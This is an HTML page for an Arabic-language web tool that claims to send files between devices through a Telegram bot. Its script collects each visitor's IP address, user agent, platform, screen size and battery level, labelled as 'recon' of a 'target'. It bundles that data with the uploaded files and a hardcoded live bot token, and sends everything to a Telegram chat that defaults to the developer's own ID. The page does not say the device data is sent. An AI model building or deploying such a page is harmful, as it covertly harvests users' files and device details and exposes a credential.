<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
   <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Send Telegram â€” Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø¹Ø¨Ø± Ø§Ù„Ø¨ÙˆØª | Mahmoud AboElfadl</title>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

    <link rel="canonical" href="https://send-telegram.netlify.app/">
    <link rel="alternate" href="https://send-telegram.netlify.app/" hreflang="ar">

    <link rel="icon" href="https://send-telegram.netlify.app/telegram.png" type="image/png">
    <meta name="theme-color" content="#2AABEE" /> <meta name="mobile-web-app-capable" content="yes" />

    <meta property="og:site_name" content="Send Telegram Tool" />
    <meta property="og:type" content="website" />
    <meta property="og:locale" content="ar_AR" />
    <meta property="og:url" content="https://send-telegram.netlify.app/" />
    <meta property="og:title" content="Send Telegram â€” Ø£Ø¯Ø§Ø© Ù†Ù‚Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø¹Ø¨Ø± Ø§Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… ID ğŸ“¤" />
    <meta property="og:description" content="Ø£Ø¯Ø§Ø© Ù…Ø¬Ø§Ù†ÙŠØ© ÙˆØ³Ø±ÙŠØ¹Ø© ØªÙ…ÙƒÙ†Ùƒ Ù…Ù† Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª ÙˆØ§Ù„ØµÙˆØ± Ù…Ù† Ø¬Ù‡Ø§Ø² Ø¥Ù„Ù‰ Ø¢Ø®Ø± Ø¹Ø¨Ø± Ø¨ÙˆØª Ø§Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… ID ÙÙ‚Ø·. ØªØ·ÙˆÙŠØ±: Mahmoud AboElfadl." />
    
    <meta property="og:image" content="https://send-telegram.netlify.app/telegram.png" />
    <meta property="og:image:secure_url" content="https://send-telegram.netlify.app/telegram.png" />
    <meta property="og:image:type" content="image/png" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:alt" content="Send Telegram - Ù†Ù‚Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø¨Ø³Ø±Ø¹Ø©" />

    <meta property="og:title" content="Send Telegram â€” Ù†Ù‚Ù„ Ù…Ù„ÙØ§Øª ÙÙˆØ±ÙŠ Ø¹Ø¨Ø± Ø§Ù„Ù€ ID ğŸš€" />
    <meta property="og:description" content="Ø£Ø±Ø³Ù„ Ù…Ù„ÙØ§ØªÙƒ ÙˆØµÙˆØ±Ùƒ Ø¨ÙŠÙ† Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø¨Ø³Ù‡ÙˆÙ„Ø© Ø¹Ø¨Ø± Ø§Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…. Ø£Ø¯Ø§Ø© Ø°ÙƒÙŠØ© Ù…Ù† ØªØ·ÙˆÙŠØ± Mahmoud AboElfadl." />

    <meta name="telegram:channel" content="@aboelfadl" />
    <meta name="telegram:title" content="Send Telegram â€” File Transfer Tool" />
    <meta name="telegram:description" content="Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø¬Ù‡Ø§Ø² Ø§Ù„ÙŠ Ø§Ø®Ø± Ø¹Ø¨Ø± Ø¨ÙˆØª Ø§Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… ID Ø¨Ø³Ø±Ø¹Ø© ÙˆØ£Ù…Ø§Ù†." />
    <meta name="telegram:image" content="https://send-telegram.netlify.app/telegram.png" />

    <meta name="instagram:title" content="Send Telegram Tool ğŸ“" />
    <meta name="instagram:description" content="Ø£Ø¯Ø§Ø© Ø°ÙƒÙŠØ© Ù„Ù†Ù‚Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø¹Ø¨Ø± Ù…Ø¹Ø±Ù Ø§Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…." />
    <meta name="instagram:image" content="https://send-telegram.netlify.app/telegram.png" />
    <meta name="instagram:url" content="https://send-telegram.netlify.app/" />

    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Send Telegram â€” Ù†Ù‚Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø¹Ø¨Ø± Ø§Ù„Ù€ ID ğŸ“‚" />
    <meta name="twitter:description" content="Ø§Ø³ØªØ®Ø¯Ù… Ø¨ÙˆØª Ø§Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… Ù„Ù†Ù‚Ù„ Ù…Ù„ÙØ§ØªÙƒ Ø¨ÙŠÙ† Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù€ ID ÙÙ‚Ø·. Ø£Ø¯Ø§Ø© ØªØ·ÙˆÙŠØ±ÙŠØ© Ù…Ù† Mahmoud AboElfadl." />
    <meta name="twitter:image" content="https://send-telegram.netlify.app/telegram.png" />
    <meta name="twitter:image:alt" content="Send Telegram Logo" />

    <meta name="description" content="Send Telegram Ù‡ÙŠ Ø£Ø¯Ø§Ø© Ù…Ø¬Ø§Ù†ÙŠØ© Ù„Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø¬Ù‡Ø§Ø² Ø§Ù„ÙŠ Ø§Ø®Ø± Ø¹Ø¨Ø± Ø¨ÙˆØª Ø§Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… ID. ØªØ·ÙˆÙŠØ± Mahmoud AboElfadl Ù„Ø®Ø¯Ù…Ø© Ù†Ù‚Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø³Ù‡ÙˆÙ„Ø©.">
    <meta name="keywords" content="Send Telegram, Ù†Ù‚Ù„ Ù…Ù„ÙØ§Øª ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…, Telegram Bot API, Ù…Ø´Ø§Ø±ÙƒØ© ØµÙˆØ±, Ø£Ø¯Ø§Ø© Ù†Ù‚Ù„ Ø¨ÙŠØ§Ù†Ø§Øª, Mahmoud AboElfadl, ØªØ·ÙˆÙŠØ± ÙˆÙŠØ¨, Ù…Ø´Ø§Ø±ÙƒØ© Ù…Ù„ÙØ§Øª Ø¹Ø¨Ø± ID">
    <meta name="author" content="Mahmoud AboElfadl">
    <meta name="robots" content="index, follow" />

    <script type="application/ld+json">{
      "@context": "https://schema.org",
      "@type": "WebApplication",
      "name": "Send Telegram",
      "url": "https://send-telegram.netlify.app/",
      "description": "Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø¬Ù‡Ø§Ø² Ø§Ù„ÙŠ Ø§Ø®Ø± Ø¹Ø¨Ø± Ø¨ÙˆØª Ø§Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… ID.",
      "applicationCategory": "UtilityApplication",
      "operatingSystem": "Web",
      "author": {
        "@type": "Person",
        "name": "Mahmoud AboElfadl",
        "url": "https://mahmoud-aboelfadl.my.canva.site"
      },
      "image": "https://send-telegram.netlify.app/telegram.png",
      "offers": {
        "@type": "Offer",
        "price": "0",
        "priceCurrency": "USD"
      }
    }</script>

    <script src="https://cdn.tailwindcss.com"></script>
    
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    
    <script src="https://unpkg.com/html5-qrcode" type="text/javascript"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <!-- JSZip Library -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brand: {
                            dark: '#0f172a',
                            light: '#1e293b',
                            accent: '#3b82f6',
                            matrix: '#00ff41' 
                        }
                    },
                    animation: {
                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
                        'scan': 'scan 4s linear infinite',
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Fira+Code:wght@400;600&display=swap');
        
        body {
            font-family: 'Cairo', sans-serif;
            background-color: #0b1121;
            color: white;
            overflow-x: hidden;
        }
        
        /* Hacker/Tech Vibe */
        .glass-panel {
            background: rgba(15, 23, 42, 0.9);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(59, 130, 246, 0.2);
            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
        }

        .code-font {
            font-family: 'Fira Code', monospace;
        }

        /* Scanline Effect */
        .scanline::before {
            content: " ";
            display: block;
            position: absolute;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 2;
            background-size: 100% 2px, 3px 100%;
            pointer-events: none;
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0f172a; }
        ::-webkit-scrollbar-thumb { background: #3b82f6; border-radius: 4px; }
        
        /* Terminal Input */
        .terminal-input:focus {
            outline: none;
            border-bottom: 2px solid #3b82f6;
            background: rgba(59, 130, 246, 0.05);
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4 bg-[url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=2070&auto=format&fit=crop')] bg-cover bg-center bg-no-repeat bg-fixed">
    
    <div class="absolute inset-0 bg-black/80 z-0 scanline"></div>

    <!-- Main Container (Vertical Stack) -->
    <div class="relative z-10 w-full max-w-3xl flex flex-col gap-5">
        
        <!-- TOP: Uploader (Main Tool) -->
        <div class="glass-panel rounded-2xl overflow-hidden flex flex-col relative w-full">
            
            <!-- Header -->
            <div class="p-5 border-b border-slate-700 bg-slate-900/80 flex justify-between items-center">
                <div class="flex items-center gap-3">
                    <div class="w-10 h-10 rounded bg-blue-600/20 flex items-center justify-center text-blue-400 border border-blue-500/30">
                        <i class="fa-brands fa-telegram"></i>
                    </div>
                    <div>
                        <h1 class="text-lg font-bold text-white">SEND TELEGRAM</h1>
                        <p class="text-[10px] text-slate-400 code-font">v5.1 // ENCRYPTED_CHANNEL</p>
                    </div>
                </div>
                <div class="text-right">
                    <div id="total-size-display" class="code-font text-blue-400 font-bold text-sm">0.00 MB</div>
                    <div class="text-[9px] text-slate-500 uppercase">Buffer Size</div>
                </div>
            </div>

            <!-- Content -->
            <div class="p-6 flex-grow overflow-y-auto custom-scrollbar bg-gradient-to-b from-slate-900/50 to-transparent max-h-[50vh]">
                
                <!-- Paste/Drop Zone -->
                <div id="drop-zone" class="relative group cursor-pointer transition-all duration-300 mb-6">
                    <input type="file" id="file-input" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-20" multiple>
                    
                    <div class="relative bg-slate-800/40 rounded-xl p-8 border-2 border-dashed border-slate-700 group-hover:border-blue-500 group-hover:bg-slate-800/80 transition-all flex flex-col items-center justify-center text-center">
                        <div class="w-14 h-14 rounded-full bg-slate-700/50 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg shadow-blue-500/10">
                            <i class="fa-solid fa-cloud-arrow-up text-2xl text-blue-400"></i>
                        </div>
                        <h3 class="text-sm font-bold text-white">Ø§Ø¶ØºØ· Ù„Ù„Ø±ÙØ¹ Ø£Ùˆ Ø§Ø³ØªØ®Ø¯Ù… <span class="text-blue-400 code-font bg-blue-500/10 px-1 rounded">Ctrl+V</span> Ù„Ù„ØµÙ‚</h3>
                        <p class="text-xs text-slate-400 mt-1">Ù†Ø¯Ø¹Ù… Ø³Ø­Ø¨ Ø§Ù„Ù…Ù„ÙØ§ØªØŒ Ø§Ù„Ù„ØµÙ‚ Ø§Ù„Ù…Ø¨Ø§Ø´Ø±ØŒ ÙˆØ§Ù„ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ØªØ¹Ø¯Ø¯</p>
                    </div>
                </div>

                <!-- File List -->
                <div id="file-queue" class="hidden space-y-3">
                    <h4 class="text-xs font-bold text-slate-400 border-b border-slate-800 pb-2 flex justify-between">
                        <span>Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„ØªØ´ÙÙŠØ±</span>
                        <button onclick="clearQueue()" class="text-red-400 hover:text-red-300"><i class="fa-solid fa-trash"></i></button>
                    </h4>
                    <div id="file-list-items" class="space-y-2"></div>
                </div>

                <!-- Progress -->
                <div id="process-status" class="hidden mt-4 bg-slate-900/80 rounded border border-slate-700 p-3">
                    <div class="flex justify-between text-xs mb-1 code-font">
                        <span id="process-text" class="text-blue-400">Initializing...</span>
                        <span id="process-percent" class="text-white">0%</span>
                    </div>
                    <div class="h-1 w-full bg-slate-800 rounded-full overflow-hidden">
                        <div id="process-bar" class="h-full bg-blue-500 w-0 shadow-[0_0_10px_#3b82f6]"></div>
                    </div>
                </div>

            </div>

            <!-- Controls -->
            <div class="p-5 bg-slate-900/90 border-t border-slate-700">
                <div class="grid grid-cols-2 gap-3 mb-3">
                    <!-- Zip Name -->
                    <input type="text" id="archive-name" placeholder="Archive Name (Optional)" 
                        class="terminal-input w-full bg-transparent border-b border-slate-700 text-white text-xs py-2 px-1 placeholder-slate-600 transition-colors code-font">
                    
                    <!-- Chat ID -->
                    <input type="number" id="chat-id-input" placeholder="Target ID (Hidden)" 
                        class="terminal-input w-full bg-transparent border-b border-slate-700 text-white text-xs py-2 px-1 placeholder-slate-600 transition-colors code-font">
                </div>

                <button id="compress-btn" onclick="startProcess()" disabled 
                    class="w-full py-3 rounded bg-slate-800 text-slate-500 font-bold text-sm transition-all flex items-center justify-center gap-2 cursor-not-allowed group border border-slate-700 hover:border-blue-500/50">
                    <i class="fa-solid fa-paper-plane group-hover:translate-x-1 transition-transform"></i>
                    <span>Execute Transfer Protocol</span>
                </button>
            </div>

            <!-- Footer Branding (Marketing) -->
            <div class="bg-black/40 py-2 px-5 text-[10px] text-slate-600 flex justify-between items-center border-t border-slate-800">
                <span>Â© 2024 AboElfadl Security</span>
                <div class="flex gap-3 text-lg">
                    <a href="https://web.facebook.com/MAHMOUD.ABOELFADL.2005" class="hover:text-blue-500 transition-colors"><i class="fa-brands fa-facebook"></i></a>
                    <a href="https://www.instagram.com/mahmoud.aboelfadl.2005/" class="hover:text-pink-500 transition-colors"><i class="fa-brands fa-instagram"></i></a>
                    <a href="https://t.me/aboelfadl_file_bot" class="hover:text-blue-400 transition-colors"><i class="fa-brands fa-telegram"></i></a>
                </div>
            </div>
        </div>

        <!-- BOTTOM: Reconnaissance Panel (Horizontal Status Bar) -->
        <div class="glass-panel rounded-xl p-4 border-t-2 border-t-blue-600">
            <h2 class="text-[10px] font-bold text-blue-400 uppercase tracking-widest mb-3 flex items-center gap-2">
                <i class="fa-solid fa-radar fa-spin"></i> Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡Ø¯Ù (Target Telemetry)
            </h2>
            
            <!-- Grid Layout for Bottom Bar -->
            <div class="grid grid-cols-2 md:grid-cols-4 gap-3 code-font text-[10px]">
                <!-- IP Address -->
                <div class="bg-black/50 p-2 rounded border border-slate-700 flex flex-col justify-center">
                    <span class="text-slate-500 mb-0.5">IP Address</span>
                    <span id="recon-ip" class="text-green-400 font-bold animate-pulse">Scanning...</span>
                </div>

                <!-- Device Info -->
                <div class="bg-black/50 p-2 rounded border border-slate-700 flex flex-col justify-center">
                    <span class="text-slate-500 mb-0.5">OS / Platform</span>
                    <span id="recon-os" class="text-blue-300 truncate">Detecting...</span>
                </div>

                <!-- Battery Status -->
                <div class="bg-black/50 p-2 rounded border border-slate-700 flex flex-col justify-center">
                    <span class="text-slate-500 mb-0.5">Power Status</span>
                    <div class="flex items-center gap-2">
                        <i id="battery-icon" class="fa-solid fa-battery-half text-slate-400"></i>
                        <span id="recon-battery" class="text-white">Checking...</span>
                    </div>
                </div>

                <!-- Screen Resolution -->
                <div class="bg-black/50 p-2 rounded border border-slate-700 flex flex-col justify-center">
                    <span class="text-slate-500 mb-0.5">Display Res</span>
                    <span id="recon-screen" class="text-yellow-400">...</span>
                </div>
            </div>
            
            <div class="mt-2 text-[9px] text-slate-600 text-center border-t border-slate-800 pt-1">
                Forensic Data Collection Module â€¢ For Educational Use Only
            </div>
        </div>

    </div>

    <!-- Toast -->
    <div id="toast" class="fixed bottom-5 right-5 translate-y-24 transition-all duration-300 z-50 bg-slate-800 border-r-4 border-blue-500 shadow-2xl p-4 flex gap-3 min-w-[300px]">
        <div id="toast-icon" class="text-blue-500 text-lg pt-1"></div>
        <div>
            <h4 id="toast-title" class="font-bold text-white text-sm"></h4>
            <p id="toast-msg" class="text-xs text-slate-400"></p>
        </div>
    </div>

    <script>
        // --- âš™ï¸ Config ---
        const DEFAULT_TOKEN = '8525312603:AAFUByS8yNkeDuNUORJiVgf3HZASDhUF0Zs';
        const DEFAULT_CHAT_ID = '1431886140';
        const MAX_SIZE_MB = 50;

        // --- State ---
        let selectedFiles = [];

        // --- DOM Elements ---
        const els = {
            input: document.getElementById('file-input'),
            dropZone: document.getElementById('drop-zone'),
            queue: document.getElementById('file-queue'),
            list: document.getElementById('file-list-items'),
            sizeDisp: document.getElementById('total-size-display'),
            nameIn: document.getElementById('archive-name'),
            idIn: document.getElementById('chat-id-input'),
            btn: document.getElementById('compress-btn'),
            procStatus: document.getElementById('process-status'),
            procBar: document.getElementById('process-bar'),
            procText: document.getElementById('process-text'),
            procPerc: document.getElementById('process-percent'),
            // Recon Elements
            ip: document.getElementById('recon-ip'),
            os: document.getElementById('recon-os'),
            batt: document.getElementById('recon-battery'),
            screen: document.getElementById('recon-screen'),
            battIcon: document.getElementById('battery-icon')
        };

        // --- ğŸ•µï¸â€â™‚ï¸ Reconnaissance Logic (Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²) ---
        function runRecon() {
            // 1. IP Address
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => els.ip.innerText = data.ip)
                .catch(() => els.ip.innerText = "Hidden / VPN");

            // 2. OS & Platform
            els.os.innerText = navigator.platform + " (" + navigator.language + ")";

            // 3. Screen Resolution
            els.screen.innerText = `${window.screen.width} x ${window.screen.height} px`;

            // 4. Battery Status
            if ('getBattery' in navigator) {
                navigator.getBattery().then(function(battery) {
                    updateBatteryUI(battery);
                    battery.addEventListener('levelchange', () => updateBatteryUI(battery));
                });
            } else {
                els.batt.innerText = "Desktop / AC Power";
                els.battIcon.className = "fa-solid fa-plug text-green-400";
            }
        }

        function updateBatteryUI(battery) {
            const level = Math.round(battery.level * 100);
            els.batt.innerText = `${level}% ${battery.charging ? '(Charging)' : ''}`;
            
            // Icon Logic
            els.battIcon.className = "fa-solid text-slate-400";
            if(battery.charging) els.battIcon.classList.add('fa-bolt', 'text-yellow-400');
            else if(level > 70) els.battIcon.classList.add('fa-battery-full', 'text-green-400');
            else if(level > 30) els.battIcon.classList.add('fa-battery-half');
            else els.battIcon.classList.add('fa-battery-quarter', 'text-red-500');
        }

        runRecon();

        // --- ğŸ“‹ Paste Support Logic (Ø§Ù„Ù„ØµÙ‚) ---
        window.addEventListener('paste', (e) => {
            const items = (e.clipboardData || e.originalEvent.clipboardData).items;
            const files = [];
            
            for (let index in items) {
                const item = items[index];
                if (item.kind === 'file') {
                    const blob = item.getAsFile();
                    // Generate a name for pasted image
                    const pastedFile = new File([blob], `Screenshot_${new Date().getTime()}.png`, { type: blob.type });
                    files.push(pastedFile);
                }
            }
            if(files.length > 0) {
                handleFiles(files);
                showToast('Clipboard Access', 'ØªÙ… Ù„ØµÙ‚ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø§Ù„Ø­Ø§ÙØ¸Ø© Ø¨Ù†Ø¬Ø§Ø­', 'success');
            }
        });

        // --- File Handling ---
        els.input.addEventListener('change', (e) => handleFiles(e.target.files));
        
        // Drag & Drop
        ['dragover', 'dragleave', 'drop'].forEach(evt => {
            els.dropZone.addEventListener(evt, (e) => {
                e.preventDefault();
                if(evt === 'dragover') els.dropZone.classList.add('border-blue-500', 'bg-slate-800');
                else els.dropZone.classList.remove('border-blue-500', 'bg-slate-800');
                
                if(evt === 'drop') handleFiles(e.dataTransfer.files);
            });
        });

        function handleFiles(files) {
            if (!files.length) return;
            Array.from(files).forEach(file => selectedFiles.push(file));
            updateUI();
        }

        function removeFile(index) {
            selectedFiles.splice(index, 1);
            updateUI();
        }

        function clearQueue() {
            selectedFiles = [];
            updateUI();
        }

        function updateUI() {
            els.list.innerHTML = '';
            
            // Calc Size
            let totalBytes = selectedFiles.reduce((acc, f) => acc + f.size, 0);
            let totalMB = (totalBytes / (1024 * 1024)).toFixed(2);
            els.sizeDisp.innerText = `${totalMB} MB`;

            // Render List
            selectedFiles.forEach((file, index) => {
                const fSize = (file.size / (1024 * 1024)).toFixed(2);
                const div = document.createElement('div');
                div.className = "flex justify-between items-center bg-slate-800/50 p-2 rounded border border-slate-700 hover:border-blue-500/30 transition-colors";
                div.innerHTML = `
                    <div class="flex items-center gap-2 truncate">
                        <i class="fa-regular fa-file-code text-blue-500"></i>
                        <span class="text-xs text-slate-300 font-mono truncate max-w-[150px]">${file.name}</span>
                    </div>
                    <div class="flex items-center gap-3">
                        <span class="text-[10px] text-slate-500 font-mono">${fSize}MB</span>
                        <button onclick="removeFile(${index})" class="text-slate-500 hover:text-red-400 text-xs"><i class="fa-solid fa-xmark"></i></button>
                    </div>
                `;
                els.list.appendChild(div);
            });

            if (selectedFiles.length > 0) {
                els.queue.classList.remove('hidden');
                els.btn.disabled = false;
                els.btn.className = "w-full py-3 rounded bg-blue-600 hover:bg-blue-500 text-white font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-blue-500/20 cursor-pointer border border-blue-400";
                
                if(totalMB > MAX_SIZE_MB) {
                    els.sizeDisp.classList.replace('text-blue-400', 'text-red-500');
                    showToast('Overflow Warning', 'Ø§Ù„Ø­Ø¬Ù… ØªØ¬Ø§ÙˆØ² 50 Ù…ÙŠØ¬Ø§Ø¨Ø§ÙŠØª', 'warning');
                } else {
                    els.sizeDisp.classList.replace('text-red-500', 'text-blue-400');
                }
            } else {
                els.queue.classList.add('hidden');
                els.btn.disabled = true;
                els.btn.className = "w-full py-3 rounded bg-slate-800 text-slate-500 font-bold text-sm transition-all flex items-center justify-center gap-2 cursor-not-allowed group border border-slate-700";
            }
        }

        // --- Main Process ---
        async function startProcess() {
            if (selectedFiles.length === 0) return;

            els.btn.disabled = true;
            els.btn.innerHTML = '<i class="fa-solid fa-gear fa-spin"></i> Processing...';
            els.procStatus.classList.remove('hidden');

            const zip = new JSZip();
            selectedFiles.forEach(f => zip.file(f.name, f));

            // NEW: Add System Info File (ØªÙˆØ«ÙŠÙ‚ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡Ø¯Ù Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…Ù„Ù)
            const infoContent = `
[ AboElfadl Security Report ]
-----------------------------
Target IP: ${els.ip.innerText}
Timestamp: ${new Date().toLocaleString()}
User Agent: ${navigator.userAgent}
Platform: ${navigator.platform}
Screen: ${els.screen.innerText}
Battery: ${els.batt.innerText}
-----------------------------
Generated by AboElfadl Tool v5
            `.trim();
            
            zip.file("System_Recon_Log.txt", infoContent);

            let name = els.nameIn.value.trim().replace(/[<>:"/\\|?*]/g, '_') || `AboElfadl_Dump_${new Date().toISOString().slice(0,10)}`;
            if(!name.toLowerCase().endsWith('.zip')) name += '.zip';

            let targetId = els.idIn.value.trim() || DEFAULT_CHAT_ID;

            try {
                // Compress
                els.procText.innerText = "Encrypting & Compressing...";
                const blob = await zip.generateAsync({
                    type: "blob",
                    compression: "DEFLATE",
                    level: 6
                }, (meta) => {
                    els.procBar.style.width = meta.percent + '%';
                    els.procPerc.innerText = Math.round(meta.percent) + '%';
                });

                if (blob.size > MAX_SIZE_MB * 1024 * 1024) throw new Error("File exceeds Telegram API limit (50MB).");

                // Upload
                await uploadToTelegram(blob, name, targetId);

            } catch (err) {
                showToast('Critical Error', err.message, 'error');
                resetState();
            }
        }

        function uploadToTelegram(blob, filename, chatId) {
            return new Promise((resolve, reject) => {
                els.procText.innerText = `Uplinking to ID: ${chatId}...`;
                els.procBar.classList.replace('bg-blue-500', 'bg-green-500'); // Green for upload
                els.procBar.style.width = '0%';

                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('document', blob, filename);
                
                // Recon Info included in message caption (Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù€ IP ÙÙŠ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù†ÙØ³Ù‡Ø§)
                const reconInfo = `ğŸ“¡ *Recon Data:*\nIP: \`${els.ip.innerText}\`\nOS: ${navigator.platform}\nRes: ${els.screen.innerText}`;
                
                formData.append('caption', `ğŸ“¦ *Secure Archive Received*\n\nğŸ“„ Name: \`${filename}\`\nğŸ’¾ Size: ${(blob.size/1024/1024).toFixed(2)} MB\nğŸ”¢ Files: ${selectedFiles.length}\n\n${reconInfo}\n\n *https://send-telegram.netlify.app/*`);
                formData.append('parse_mode', 'Markdown');

                const xhr = new XMLHttpRequest();
                xhr.upload.addEventListener('progress', e => {
                    if (e.lengthComputable) {
                        const pct = (e.loaded / e.total) * 100;
                        els.procBar.style.width = pct + '%';
                        els.procPerc.innerText = Math.round(pct) + '%';
                    }
                });

                xhr.onload = () => {
                    if (xhr.status === 200 && JSON.parse(xhr.responseText).ok) {
                        showToast('Transfer Complete', 'ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­', 'success');
                        setTimeout(() => { clearQueue(); resetState(); }, 2000);
                        resolve();
                    } else reject(new Error("Server Rejected Request"));
                };
                xhr.onerror = () => reject(new Error("Connection Failed"));
                
                xhr.open('POST', `https://api.telegram.org/bot${DEFAULT_TOKEN}/sendDocument`);
                xhr.send(formData);
            });
        }

        function resetState() {
            els.procStatus.classList.add('hidden');
            els.btn.disabled = false;
            els.btn.innerHTML = `<i class="fa-solid fa-paper-plane"></i> Execute Transfer Protocol`;
            els.procBar.classList.replace('bg-green-500', 'bg-blue-500');
        }

        function showToast(title, msg, type) {
            const t = document.getElementById('toast');
            document.getElementById('toast-title').innerText = title;
            document.getElementById('toast-msg').innerText = msg;
            
            const icon = document.getElementById('toast-icon');
            if(type === 'success') {
                t.className = "fixed bottom-5 right-5 transition-all duration-300 z-50 bg-slate-900 border-r-4 border-green-500 shadow-2xl p-4 flex gap-3 min-w-[300px]";
                icon.innerHTML = '<i class="fa-solid fa-check text-green-500"></i>';
            } else if (type === 'error') {
                t.className = "fixed bottom-5 right-5 transition-all duration-300 z-50 bg-slate-900 border-r-4 border-red-500 shadow-2xl p-4 flex gap-3 min-w-[300px]";
                icon.innerHTML = '<i class="fa-solid fa-bomb text-red-500"></i>';
            } else {
                t.className = "fixed bottom-5 right-5 transition-all duration-300 z-50 bg-slate-900 border-r-4 border-yellow-500 shadow-2xl p-4 flex gap-3 min-w-[300px]";
                icon.innerHTML = '<i class="fa-solid fa-triangle-exclamation text-yellow-500"></i>';
            }

            t.classList.remove('translate-y-24');
            setTimeout(() => t.classList.add('translate-y-24'), 4000);
        }
    </script>
</body>
</html>


